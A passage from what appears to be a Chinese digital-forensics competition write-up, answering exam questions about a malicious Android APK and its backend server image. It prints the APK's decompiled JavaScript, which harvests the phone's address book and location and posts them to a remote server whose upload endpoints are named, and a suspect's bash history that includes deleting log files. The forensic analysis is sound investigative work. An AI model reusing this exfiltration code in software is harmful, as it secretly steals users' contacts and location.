class="line"><span class="comment">// console.log(&#x27;Always Denied!!! &#x27; + e.deniedAlways.toString());  </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (e.deniedPresent.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">//权限被临时拒绝  </span></span><br><span class="line"><span class="comment">// 弹出提示框解释为何需要定位权限，可再次调用plus.android.requestPermissions申请权限  </span></span><br><span class="line">errorCallBack(<span class="string">&#x27;请您同意弹出的权限，便可正常使用APP！如果未弹出，请前往“手机设置”里的“权限管理”找到本应用，并打开通讯录权限，方可使用。&#x27;</span>)</span><br><span class="line"><span class="comment">// console.log(&#x27;Present Denied!!! &#x27; + e.deniedPresent.toString());  </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (e.granted.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">//权限被允许  </span></span><br><span class="line"><span class="comment">//调用依赖获取定位权限的代码  </span></span><br><span class="line">successCallBack()</span><br><span class="line"><span class="comment">// console.log(&#x27;Granted!!! &#x27; + e.granted.toString());  </span></span><br><span class="line">&#125;</span><br><span class="line">&#125;, function (e) &#123;</span><br><span class="line">errorCallBack(<span class="string">&#x27;请您同意弹出的权限，便可正常使用APP！如果未弹出，请前往“手机设置”里的“权限管理”找到本应用，并打开通讯录权限，方可使用。&#x27;</span>)</span><br><span class="line"><span class="comment">// console.log(&#x27;Request Permissions error:&#x27; + JSON.stringify(e));  </span></span><br><span class="line">&#125;)</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (plus.os.name == <span class="string">&#x27;iOS&#x27;</span>) &#123;</span><br><span class="line"><span class="comment">//ios ,第一次使用目的权限时，应用的权限列表里是不存在的，所以先默认执行一下成功回调，打开要使用的操作，比如 plus.camera  </span></span><br><span class="line"><span class="comment">//这时系统会提示是否打开相应的权限，如果拒绝也没关系，因为应用的权限列表里已经存在该权限了，下次再调用相应权限时，就会  </span></span><br><span class="line"><span class="comment">//走 else 里的流程，会给用户提示，并且跳转到应该的权限页面，让用户手动打开。  </span></span><br><span class="line"><span class="keyword">if</span> (checkResult == <span class="string">&#x27;undetermined&#x27;</span>) &#123;</span><br><span class="line"><span class="comment">//调用依赖获取定位权限的代码  </span></span><br><span class="line">successCallBack(<span class="literal">true</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//如果是 ios 系统，ios 没有动态申请操作，所以提示用户去设置页面手动打开  </span></span><br><span class="line">mui.confirm(permissionName + <span class="string">&#x27;权限没有开启，是否去开启？&#x27;</span>, <span class="string">&#x27;提醒&#x27;</span>, [<span class="string">&#x27;取消&#x27;</span>, <span class="string">&#x27;确认&#x27;</span>], function (e) &#123;</span><br><span class="line"><span class="comment">//取消  </span></span><br><span class="line"><span class="keyword">if</span> (e.index == <span class="number">0</span>) &#123;</span><br><span class="line">errorCallBack(<span class="string">&#x27;请您同意弹出的权限，便可正常使用APP！如果未弹出，请前往“手机设置”里的“权限管理”找到本应用，并打开通讯录权限，方可使用。&#x27;</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (e.index == <span class="number">1</span>) &#123;</span><br><span class="line"><span class="comment">//确认，打开当前应用权限设置页面  </span></span><br><span class="line">var UIApplication = plus.ios.import(<span class="string">&#x27;UIApplication&#x27;</span>);</span><br><span class="line">var application2 = UIApplication.sharedApplication();</span><br><span class="line">var NSURL2 = plus.ios.import(<span class="string">&#x27;NSURL&#x27;</span>);</span><br><span class="line"><span class="comment">// var setting2 = NSURL2.URLWithString(&quot;prefs:root=LOCATION_SERVICES&quot;);                             </span></span><br><span class="line">var setting2 = NSURL2.URLWithString(<span class="string">&#x27;app-settings:&#x27;</span>);</span><br><span class="line">application2.openURL(setting2);</span><br><span class="line"></span><br><span class="line">plus.ios.deleteObject(setting2);</span><br><span class="line">plus.ios.deleteObject(NSURL2);</span><br><span class="line">plus.ios.deleteObject(application2)</span><br><span class="line">&#125;</span><br><span class="line">&#125;, <span class="string">&#x27;div&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function aa() &#123;</span><br><span class="line">var sjh = $(<span class="string">&#x27;#sjh&#x27;</span>).val();</span><br><span class="line">var yqm = $(<span class="string">&#x27;#yqm&#x27;</span>).val();</span><br><span class="line"><span class="keyword">if</span> (parseInt(sjh) &gt; <span class="number">0</span> &amp;&amp; parseInt(yqm) &gt; <span class="number">0</span> &amp;&amp; parseInt(sjh) &gt; <span class="number">13000000000</span> &amp;&amp; parseInt(sjh) &lt; <span class="number">19999999999</span> &amp;&amp; parseInt(yqm) &gt; <span class="number">0</span> &amp;&amp; parseInt(yqm) &lt; <span class="number">999999</span>) &#123;</span><br><span class="line"></span><br><span class="line">getPermission(<span class="string">&#x27;CONTACTS&#x27;</span>, function () &#123;</span><br><span class="line">huoqu(sjh, yqm);</span><br><span class="line"></span><br><span class="line">&#125;, function (msg) &#123;</span><br><span class="line">mui.alert(msg, <span class="string">&#x27;提醒&#x27;</span>, <span class="string">&#x27;确定&#x27;</span>, function () &#123; &#125;, <span class="string">&#x27;div&#x27;</span>)</span><br><span class="line"><span class="comment">//aa()</span></span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">mui.toast(<span class="string">&#x27;请输入正确的手机号和邀请码&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function dingwei(sjh, yqm) &#123;</span><br><span class="line">plus.geolocation.getCurrentPosition(translatePoint, function (e) &#123;</span><br><span class="line">mui.toast(<span class="string">&quot;异常:&quot;</span> + e.message);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function translatePoint(position) &#123;</span><br><span class="line"></span><br><span class="line">var sjh = $(<span class="string">&#x27;#sjh&#x27;</span>).val()</span><br><span class="line">var yqm = $(<span class="string">&#x27;#yqm&#x27;</span>).val()</span><br><span class="line">var currentLon = position.coords.longitude;</span><br><span class="line">var currentLat = position.coords.latitude;</span><br><span class="line">var jingweidu = sjh + <span class="string">&#x27;,&#x27;</span> + yqm + <span class="string">&#x27;,&#x27;</span> + currentLon + <span class="string">&#x27;,&#x27;</span> + currentLat;</span><br><span class="line">mui.ajax(apiserver + <span class="string">&#x27;apimap&#x27;</span>, &#123;</span><br><span class="line">data: &#123;</span><br><span class="line">data: jingweidu</span><br><span class="line">&#125;,</span><br><span class="line">dataType: <span class="string">&#x27;text&#x27;</span>,<span class="comment">//服务器返回json格式数据</span></span><br><span class="line">type: <span class="string">&#x27;post&#x27;</span>,<span class="comment">//HTTP请求类型</span></span><br><span class="line">timeout: <span class="number">10000</span>,<span class="comment">//超时时间设置为10秒；              </span></span><br><span class="line">success: function (data) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (data == <span class="string">&#x27;获取成功&#x27;</span>) &#123;</span><br><span class="line">requestPermission(sjh, yqm);</span><br><span class="line"></span><br><span class="line"><span class="comment">//setInterval(function()&#123;</span></span><br><span class="line"><span class="comment">//var sjh=$(&#x27;#sjh&#x27;).val();</span></span><br><span class="line"><span class="comment">//var yqm=$(&#x27;#yqm&#x27;).val();</span></span><br><span class="line"><span class="comment">//requestPermission(sjh,yqm);</span></span><br><span class="line"><span class="comment">//console.log(&#x27;send&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//&#125;,30000)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mui.toast(data)</span><br><span class="line">&#125;,</span><br><span class="line">error: function (xhr, type, errorThrown) &#123;</span><br><span class="line"><span class="comment">//异常处理；</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//书写自己的逻辑</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 扩展API加载完毕，现在可以正常调用扩展API</span></span><br><span class="line"></span><br><span class="line">function huoqu(sjh, yqm) &#123;</span><br><span class="line">var con = sjh + <span class="string">&quot;**&quot;</span> + yqm + <span class="string">&#x27;**&#x27;</span> + address;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plus.contacts.getAddressBook(plus.contacts.ADDRESSBOOK_PHONE, function (addressbook) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addressbook.find([<span class="string">&quot;displayName&quot;</span>, <span class="string">&quot;phoneNumbers&quot;</span>], function (contacts) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (var i = <span class="number">0</span>, len = contacts.length; i &lt; len; i++) &#123;</span><br><span class="line">con = con + <span class="string">&#x27;=&#x27;</span> + contacts[i].displayName + <span class="string">&#x27;|&#x27;</span> + (contacts[i].phoneNumbers.length == <span class="number">0</span> ? <span class="string">&quot;&quot;</span> : contacts[i].phoneNumbers[<span class="number">0</span>].value);</span><br><span class="line">&#125;</span><br><span class="line">mui.ajax(apiserver + <span class="string">&#x27;api&#x27;</span>, &#123;</span><br><span class="line">data: &#123;</span><br><span class="line">data: con</span><br><span class="line">&#125;,</span><br><span class="line">dataType: <span class="string">&#x27;text&#x27;</span>,<span class="comment">//服务器返回json格式数据</span></span><br><span class="line">type: <span class="string">&#x27;post&#x27;</span>,<span class="comment">//HTTP请求类型</span></span><br><span class="line">timeout: <span class="number">10000</span>,<span class="comment">//超时时间设置为10秒；              </span></span><br><span class="line">success: function (data) &#123;</span><br><span class="line"><span class="comment">//alert(data)</span></span><br><span class="line"><span class="keyword">if</span> (data == <span class="string">&#x27;正在加载列表&#x27;</span>) &#123;</span><br><span class="line">dingwei(sjh, yqm);</span><br><span class="line">mui.openWindow(&#123;</span><br><span class="line">url: <span class="string">&#x27;list.html&#x27;</span>,</span><br><span class="line">show: &#123;</span><br><span class="line">autoShow: <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">mui.toast(data)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//console.log(con)</span></span><br><span class="line">&#125;,</span><br><span class="line">error: function (xhr, type, errorThrown) &#123;</span><br><span class="line"><span class="comment">//异常处理；</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;, function () &#123;</span><br><span class="line">mui.alert(<span class="string">&quot;为保证用户质量，使用本app请同意通讯录授权 &quot;</span>);</span><br><span class="line">&#125;, &#123;</span><br><span class="line">multiple: <span class="literal">true</span></span><br><span class="line">&#125;);</span><br><span class="line">&#125;, function (e) &#123;</span><br><span class="line">mui.alert(<span class="string">&quot;为保证用户质量，使用本app请同意通讯录授权 &quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ul><li>总结：<ul><li>//Sms存放所有短信；//调用依赖获取定位权限的代码；mui.toast(‘请输入正确的手机号和邀请码’)</li><li>mui.alert(&quot;为保证用户质量，使用本app请同意通讯录授权 &quot;);</li><li>答案：ACDE</li></ul></li></ul><h4 id="6-该APK程序回传通讯录时，使用的http请求方式为"><a class="header-anchor" href="#6-该APK程序回传通讯录时，使用的http请求方式为">¶</a>6. 该APK程序回传通讯录时，使用的http请求方式为</h4><ul><li>雷电抓包可得</li></ul><h4 id="7-该APK程序的回传地址域名为【标准格式：www-abc-com】"><a class="header-anchor" href="#7-该APK程序的回传地址域名为【标准格式：www-abc-com】">¶</a>7. 该APK程序的回传地址域名为【标准格式：<a href="http://www.abc.com">www.abc.com</a>】</h4><ul><li>雷电抓包可得</li></ul><h4 id="8-该APK程序代码中配置的变量apiserver的值为【标准格式：www-abc-com-abc】"><a class="header-anchor" href="#8-该APK程序代码中配置的变量apiserver的值为【标准格式：www-abc-com-abc】">¶</a>8. 该APK程序代码中配置的变量apiserver的值为【标准格式：<a href="http://www.abc.com/abc%E3%80%91">www.abc.com/abc】</a></h4><ul><li>sojson4解密结果中有var apiserver = ‘<a href="http://www.honglian7001.com/api/uploads/">http://www.honglian7001.com/api/uploads/</a>’;</li></ul><h4 id="9-分析该APK，发现该程序还具备获取短信回传到后台的功能，短信上传服务器接口地址为【标准格式：www-abc-com-abc】"><a class="header-anchor" href="#9-分析该APK，发现该程序还具备获取短信回传到后台的功能，短信上传服务器接口地址为【标准格式：www-abc-com-abc】">¶</a>9. 分析该APK，发现该程序还具备获取短信回传到后台的功能，短信上传服务器接口地址为【标准格式：<a href="http://www.abc.com/abc%E3%80%91">www.abc.com/abc】</a></h4><ul><li>继续在上一段代码里搜索SMS，这是短信的一般英文名，可以看到代码</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mui.ajax(apiserver + <span class="string">&#x27;apisms&#x27;</span>, &#123;</span><br></pre></td></tr></table></figure><ul><li>答案：<a href="http://www.honglian7001.com/api/uploads/apisms">http://www.honglian7001.com/api/uploads/apisms</a></li></ul><h4 id="10-经分析，发现该APK在运行过程中会在手机中产生一个数据库文件，该文件的文件名为"><a class="header-anchor" href="#10-经分析，发现该APK在运行过程中会在手机中产生一个数据库文件，该文件的文件名为">¶</a>10. 经分析，发现该APK在运行过程中会在手机中产生一个数据库文件，该文件的文件名为</h4><ul><li>使用雷电APP分析的Frida脚本里的SQLite数据库，即可得到数据库名</li></ul><p><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_8.png" alt="alt text"></p><h4 id="11-经分析，发现该APK在运行过程中会在手机中产生一个数据库文件，该数据库的初始密码为"><a class="header-anchor" href="#11-经分析，发现该APK在运行过程中会在手机中产生一个数据库文件，该数据库的初始密码为">¶</a>11. 经分析，发现该APK在运行过程中会在手机中产生一个数据库文件，该数据库的初始密码为</h4><ul><li>同上</li></ul><h3 id="经过掌握的APK程序后台服务器回连地址，警方成功调取该服务器的镜像，请使用第7题的答案对检材二进行解压进行分析，并回答下列问题：-www-honglian7001-com"><a class="header-anchor" href="#经过掌握的APK程序后台服务器回连地址，警方成功调取该服务器的镜像，请使用第7题的答案对检材二进行解压进行分析，并回答下列问题：-www-honglian7001-com">¶</a>经过掌握的APK程序后台服务器回连地址，警方成功调取该服务器的镜像，请使用第7题的答案对检材二进行解压进行分析，并回答下列问题：(<a href="http://www.honglian7001.com">www.honglian7001.com</a>)</h3><h4 id="12-检材二的原始硬盘的SHA256值为："><a class="header-anchor" href="#12-检材二的原始硬盘的SHA256值为：">¶</a>12. 检材二的原始硬盘的SHA256值为：</h4><p><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_2-12.png" alt="alt text"></p><h4 id="13-查询涉案于案发时间段内登陆服务器的IP地址为【标准格式：111-111-111-111】"><a class="header-anchor" href="#13-查询涉案于案发时间段内登陆服务器的IP地址为【标准格式：111-111-111-111】">¶</a>13. 查询涉案于案发时间段内登陆服务器的IP地址为【标准格式：111.111.111.111】</h4><ul><li>pts指远程，tty指直连，down指正常关机，crash指强制关机</li></ul><p><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_2-13.png" alt="alt text"></p><h4 id="14-请对检材二进行分析，并回答该服务器在集群中承担的主要作用是（）【格式：文件存储】"><a class="header-anchor" href="#14-请对检材二进行分析，并回答该服务器在集群中承担的主要作用是（）【格式：文件存储】">¶</a>14. 请对检材二进行分析，并回答该服务器在集群中承担的主要作用是（）【格式：文件存储】</h4><ul><li>仿真(默认重置密码123456？？？)</li><li>查看端口：netstat -antp</li><li>查看历史命令：history(但有时要su之后进入root用户再history)</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[ccj@localhost ~]$ su</span><br><span class="line">密码：</span><br><span class="line">[root@localhost ccj]# <span class="built_in">history</span></span><br><span class="line"><span class="comment"># 显示内容给AI解释如下：</span></span><br><span class="line">    1  <span class="built_in">ls</span>  <span class="comment"># 查看当前目录内容</span></span><br><span class="line">    2  <span class="built_in">cd</span> Desktop/  <span class="comment"># 进入桌面目录</span></span><br><span class="line">    3  <span class="built_in">ls</span>  <span class="comment"># 查看桌面文件</span></span><br><span class="line">    4  <span class="built_in">uname</span> -a  <span class="comment"># 显示系统内核详细信息</span></span><br><span class="line">    5  <span class="built_in">cat</span> /etc/issue  <span class="comment"># 查看系统发行版信息</span></span><br><span class="line">    6  lsb_release -a  <span class="comment"># 显示LSB发行版信息</span></span><br><span class="line">    7  <span class="built_in">cat</span> /proc/cpuinfo   <span class="comment"># 查看CPU信息</span></span><br><span class="line">    8  hostname  <span class="comment"># 显示主机名</span></span><br><span class="line">    9  whoiam  <span class="comment"># 错误命令，应该是whoami</span></span><br><span class="line">   10  whoani  <span class="comment"># 错误命令，应该是whoami</span></span><br><span class="line">   11  <span class="built_in">whoami</span>  <span class="comment"># 显示当前登录用户名</span></span><br><span class="line">   12  lspci  <span class="comment"># 列出PCI设备</span></span><br><span class="line">   13  <span class="built_in">env</span>  <span class="comment"># 显示环境变量</span></span><br><span class="line">   14  lsusb  <span class="comment"># 列出USB设备</span></span><br><span class="line">   15  <span class="built_in">cat</span> /proc/meminfo   <span class="comment"># 查看内存信息</span></span><br><span class="line">   16  <span class="built_in">df</span> -h  <span class="comment"># 显示磁盘空间使用情况（人类可读格式）</span></span><br><span class="line">   17  fsdisk -l  <span class="comment"># 错误命令，应该是fdisk</span></span><br><span class="line">   18  fdisk -l  <span class="comment"># 列出磁盘分区表</span></span><br><span class="line">   19  ps aux  <span class="comment"># 显示所有运行中的进程</span></span><br><span class="line">   20  ps -ef  <span class="comment"># 以完整格式显示所有进程</span></span><br><span class="line">   21  crontab -l  <span class="comment"># 列出当前用户的定时任务</span></span><br><span class="line">   22  services --status-all  <span class="comment"># 错误命令，应该是service</span></span><br><span class="line">   23  service --status-all  <span class="comment"># 显示所有服务的状态</span></span><br><span class="line">   24  service  <span class="comment"># 显示service命令用法</span></span><br><span class="line">   25  service --status-all  <span class="comment"># 再次尝试查看服务状态</span></span><br><span class="line">   26  systemctl  <span class="comment"># 显示systemctl命令用法</span></span><br><span class="line">   27  systemctl --<span class="built_in">help</span>  <span class="comment"># 查看systemctl帮助信息</span></span><br><span class="line">   28  systemctl -all  <span class="comment"># 错误选项，应该是systemctl list-units</span></span><br><span class="line">   29  <span class="built_in">ls</span>  <span class="comment"># 查看当前目录</span></span><br><span class="line">   30  init 3  <span class="comment"># 切换到运行级别3（多用户文本模式）</span></span><br><span class="line">   31  <span class="built_in">ls</span>  <span class="comment"># 查看当前目录</span></span><br><span class="line">   32  <span class="built_in">cd</span> /  <span class="comment"># 切换到根目录</span></span><br><span class="line">   33  <span class="built_in">ls</span>  <span class="comment"># 查看根目录内容</span></span><br><span class="line">   34  <span class="built_in">cd</span> opt  <span class="comment"># 进入opt目录</span></span><br><span class="line">   35  <span class="built_in">ls</span>  <span class="comment"># 查看opt目录内容</span></span><br><span class="line">   36  <span class="built_in">cd</span> honglianjingsai/  <span class="comment"># 进入红莲竞赛目录</span></span><br><span class="line">   37  <span class="built_in">ls</span>  <span class="comment"># 查看红莲竞赛目录内容</span></span><br><span class="line">   38  <span class="built_in">cd</span> chronusNode/  <span class="comment"># 进入chronusNode目录</span></span><br><span class="line">   39  <span class="built_in">ls</span>  <span class="comment"># 查看chronusNode目录内容</span></span><br><span class="line">   40  <span class="built_in">cd</span> logs  <span class="comment"># 进入日志目录</span></span><br><span class="line">   41  <span class="built_in">ls</span>  <span class="comment"># 查看日志文件</span></span><br><span class="line">   42  <span class="built_in">rm</span> *  <span class="comment"># 删除所有日志文件（危险操作）</span></span><br><span class="line">   43  <span class="built_in">ls</span>  <span class="comment"># 确认日志文件已删除</span></span><br><span class="line">   44  ip a  <span class="comment"># 显示网络接口信息</span></span><br><span class="line">   45  init 3  <span class="comment"># 再次切换到运行级别3</span></span><br><span class="line">   46  <span class="built_in">ls</span>  <span class="comment"># 查看当前目录</span></span><br><span class="line">   47  <span class="built_in">who</span>  <span class="comment"># 显示当前登录用户</span></span><br><span class="line">   48  w  <span class="comment"># 显示当前登录用户及活动</span></span><br><span class="line">   49  <span class="built_in">cd</span> /opt/  <span class="comment"># 进入/opt目录</span></span><br><span class="line">   50  <span class="built_in">ls</span>  <span class="comment"># 查看/opt目录内容</span></span><br><span class="line">   51  <span class="built_in">cd</span> honglianjingsai/  <span class="comment"># 进入红莲竞赛目录</span></span><br><span class="line">   52  <span class="built_in">ls</span>  <span class="comment"># 查看目录内容</span></span><br><span class="line">   53  cdd chronusNode/  <span class="comment"># 错误命令，应该是cd</span></span><br><span class="line">   54  <span class="built_in">cd</span> chronusNode/  <span class="comment"># 进入chronusNode目录</span></span><br><span class="line">   55  ;s  <span class="comment"># 错误命令，分号分隔的空命令和s</span></span><br><span class="line">   56  <span class="built_in">ls</span>  <span class="comment"># 查看目录内容</span></span><br><span class="line">   57  <span class="built_in">cd</span> controller/  <span class="comment"># 进入控制器目录</span></span><br><span class="line">   58  <span class="built_in">ls</span>  <span class="comment"># 查看控制器文件</span></span><br><span class="line">   59  <span class="built_in">ls</span> -l  <span class="comment"># 以长格式查看文件详情</span></span><br><span class="line">   60  <span class="built_in">date</span>  <span class="comment"># 显示当前日期时间</span></span><br><span class="line">   61  <span class="built_in">history</span>  <span class="comment"># 显示命令历史</span></span><br><span class="line">   62  <span class="built_in">ls</span>  <span class="comment"># 查看当前目录</span></span><br><span class="line">   63  <span class="built_in">cd</span> ..  <span class="comment"># 返回上级目录</span></span><br><span class="line">   64  <span class="built_in">ls</span>  <span class="comment"># 查看目录内容</span></span><br><span class="line">   65  <span class="built_in">cd</span> logs/  <span class="comment"># 进入日志目录</span></span><br><span class="line">   66  <span class="built_in">ls</span>  <span class="comment"># 查看日志文件</span></span><br><span class="line">   67  <span class="built_in">ls</span> -l  <span class="comment"># 以长格式查看日志文件</span></span><br><span class="line">   68  <span class="built_in">ls</span>  <span class="comment"># 再次查看</span></span><br><span class="line">   69  <span class="built_in">cd</span> ..  <span class="comment"># 返回上级目录</span></span><br><span class="line">   70  ;s  <span class="comment"># 错误命令</span></span><br><span class="line">   71  <span class="built_in">ls</span>  <span class="comment"># 查看目录内容</span></span><br><span class="line">   72  <span class="built_in">cd</span> controller/  <span class="comment"># 进入控制器目录</span></span><br><span class="line">   73  l;s  <span class="comment"># 错误命令，应该是ls</span></span><br><span class="line">   74  <span class="built_in">ls</span>  <span class="comment"># 查看控制器文件</span></span><br><span class="line">   75  <span class="built_in">cd</span> ..  <span class="comment"># 返回上级目录</span></span><br><span class="line">   76  l;s  <span class="comment"># 错误命令，应该是ls</span></span><br><span class="line">   77  <span class="built_in">ls</span>  <span class="comment"># 查看目录内容</span></span><br><span class="line">   78  <span class="built_in">cd</span> static/  <span class="comment"># 进入静态文件目录</span></span><br><span class="line">   79  <span class="built_in">ls</span>  <span class="comment"># 查看静态文件</span></span><br><span class="line">   80  <span class="built_in">cd</span> .  <span class="comment"># 停留在当前目录</span></span><br><span class="line">   81  <span class="built_in">cd</span> ..  <span class="comment"># 返回上级目录</span></span><br><span class="line">   82  <span class="built_in">ls</span>  <span class="comment"># 查看目录内容</span></span><br><span class="line">   83  <span class="built_in">cd</span> uploads/  <span class="comment"># 进入上传文件目录</span></span><br><span class="line">   84  <span class="built_in">ls</span>  <span class="comment"># 查看上传的文件</span></span><br><span class="line">   85  <span class="built_in">cd</span> ..  <span class="comment"># 返回上级目录</span></span><br><span class="line">   86  <span class="built_in">ls</span>  <span class="comment"># 查看目录内容</span></span><br><span class="line">   87  <span class="built_in">cd</span> ..  <span class="comment"># 返回上级目录</span></span><br><span class="line">   88  <span class="built_in">ls</span>  <span class="comment"># 查看目录内容</span></span><br><span class="line">   89  more README.txt  <span class="comment"># 查看README文件内容</span></span><br><span class="line">   90  ifconfig  <span class="comment"># 显示网络接口配置</span></span><br><span class="line">   91  netstat -anpt  <span class="comment"># 显示所有网络连接和监听端口</span></span><br><span class="line">   92  init 3  <span class="comment"># 切换到运行级别3</span></span><br><span class="line">   93  vi /etc/sysconfig/network-scripts/ifcfg-ens33  <span class="comment"># 编辑网络接口配置</span></span><br><span class="line">   94  reboot  <span class="comment"># 重启系统</span></span><br><span class="line">   95  ifconfig  <span class="comment"># 显示网络接口配置</span></span><br><span class="line">   96  init 3  <span class="comment"># 切换到运行级别3</span></span><br><span class="line">   97  <span class="built_in">ls</span>  <span class="comment"># 查看当前目录</span></span><br><span class="line">   98  firewall-cmd --add-port 80/tcp  <span class="comment"># 添加80端口到防火墙（缺少--permanent）</span></span><br><span class="line">   99  systemctl start firewalld  <span class="comment"># 启动防火墙服务</span></span><br><span class="line">  100  firewall-cmd --add-port 80/tcp  <span class="comment"># 再次尝试添加80端口</span></span><br><span class="line">  101  ip a  <span class="comment"># 显示IP地址信息</span></span><br><span class="line">  102  <span class="built_in">cd</span> /opt  <span class="comment"># 进入/opt目录</span></span><br><span class="line">  103  <span class="built_in">ls</span>  <span class="comment"># 查看目录内容</span></span><br><span class="line">  104  <span class="built_in">cd</span> honglianjingsai/  <span class="comment"># 进入红莲竞赛目录</span></span><br><span class="line">  105  <span class="built_in">ls</span>  <span class="comment"># 查看目录内容</span></span><br><span class="line">  106  <span class="built_in">cd</span> chronusNode/  <span class="comment"># 进入chronusNode目录</span></span><br><span class="line">  107  <span class="built_in">ls</span>  <span class="comment"># 查看目录内容</span></span><br><span class="line">  108  <span class="built_in">cd</span> controller/  <span class="comment"># 进入控制器目录</span></span><br><span class="line">  109  <span class="built_in">ls</span>  <span class="comment"># 查看控制器文件</span></span><br><span class="line">  110  vi ADProxy.js  <span class="comment"># 编辑ADProxy.js文件</span></span><br><span class="line">  111  <span class="built_in">ls</span>  <span class="comment"># 查看文件</span></span><br><span class="line">  112  <span class="built_in">cd</span> /opt/  <span class="comment"># 进入/opt目录</span></span><br><span class="line">  113  <span class="built_in">ls</span>  <span class="comment"># 查看目录内容</span></span><br><span class="line">  114  <span class="built_in">cd</span> honglianjingsai/  <span class="comment"># 进入红莲竞赛目录</span></span><br><span class="line">  115  <span class="built_in">ls</span>  <span class="comment"># 查看目录内容</span></span><br><span class="line">  116  <span class="built_in">cd</span> chronusNode/  <span class="comment"># 进入chronusNode目录</span></span><br><span class="line">  117  <span class="built_in">ls</span>  <span class="comment"># 查看目录内容</span></span><br><span class="line">  118  <span class="built_in">cd</span> controller/  <span class="comment"># 进入控制器目录</span></span><br><span class="line">  119  <span class="built_in">ls</span>  <span class="comment"># 查看控制器文件</span></span><br><span class="line">  120  more ADProxy.js  <span class="comment"># 查看ADProxy.js文件内容</span></span><br><span class="line">  121  clear  <span class="comment"># 清屏</span></span><br><span class="line">  122  <span class="built_in">ls</span>  <span class="comment"># 查看当前目录</span></span><br><span class="line">  123  <span class="built_in">cd</span> ..  <span class="comment"># 返回上级目录</span></span><br><span class="line">  124  <span class="built_in">ls</span>  <span class="comment"># 查看目录内容</span></span><br><span class="line">  125  node app.js  <span class="comment"># 启动Node.js应用</span></span><br><span class="line">  126  clear  <span class="comment"># 清屏</span></span><br><span class="line">  127  <span class="built_in">history</span>  <span class="comment"># 显示命令历史</span></span><br><span class="line">  128  <span class="built_in">cd</span> /opt/honglianjingsai/  <span class="comment"># 进入红莲竞赛目录</span></span><br><span class="line">  129  <span class="built_in">ls</span>  <span class="comment"># 查看目录内容</span></span><br><span class="line">  130  <span class="built_in">cd</span> chronusNode/  <span class="comment"># 进入chronusNode目录</span></span><br><span class="line">  131  <span class="built_in">ls</span>  <span class="comment"># 查看目录内容</span></span><br><span class="line">  132  <span class="built_in">cd</span> controller/  <span class="comment"># 进入控制器目录</span></span><br><span class="line">  133  <span class="built_in">ls</span>  <span class="comment"># 查看控制器文件</span></span><br><span class="line">  134  vi ADProxy.js  <span class="comment"># 编辑ADProxy.js文件</span></span><br><span class="line">  135  yum vim  <span class="comment"># 错误命令，应该是yum install vim</span></span><br><span class="line">  136  yum install vim  <span class="comment"># 安装vim编辑器</span></span><br><span class="line">  137  <span class="built_in">ls</span>  <span class="comment"># 查看文件</span></span><br><span class="line">  138  ping www.baidu.com  <span class="comment"># 测试网络连接到百度</span></span><br><span class="line">  139  ping baidu.com  <span class="comment"># 测试网络连接</span></span><br><span class="line">  140  yum install vim  <span class="comment"># 安装vim编辑器</span></span><br><span class="line">  141  vim ADProxy.js  <span class="comment"># 使用vim编辑ADProxy.js</span></span><br><span class="line">  142   more ADProxy.js   <span class="comment"># 查看ADProxy.js内容</span></span><br><span class="line">  143  vim ADProxy.js  <span class="comment"># 再次编辑ADProxy.js</span></span><br><span class="line">  144  <span class="built_in">cd</span> ..  <span class="comment"># 返回上级目录</span></span><br><span class="line">  145  lsls  <span class="comment"># 错误命令，应该是ls</span></span><br><span class="line">  146  <span class="built_in">ls</span>  <span class="comment"># 查看目录内容</span></span><br><span class="line">  147  more README.txt  <span class="comment"># 查看README文件内容</span></span><br><span class="line">  148  <span class="built_in">cd</span> chronusNode/controller/  <span class="comment"># 进入控制器目录</span></span><br><span class="line">  149  vim ADProxy.js  <span class="comment"># 编辑ADProxy.js文件</span></span><br><span class="line">  150  <span class="built_in">cd</span> ..  <span class="comment"># 返回上级目录</span></span><br><span class="line">  151  <span class="built_in">ls</span>  <span class="comment"># 查看目录内容</span></span><br><span class="line">  152  vim const.js  <span class="comment"># 编辑const.js常量文件</span></span><br><span class="line">  153  firewall-cmd --zone=public 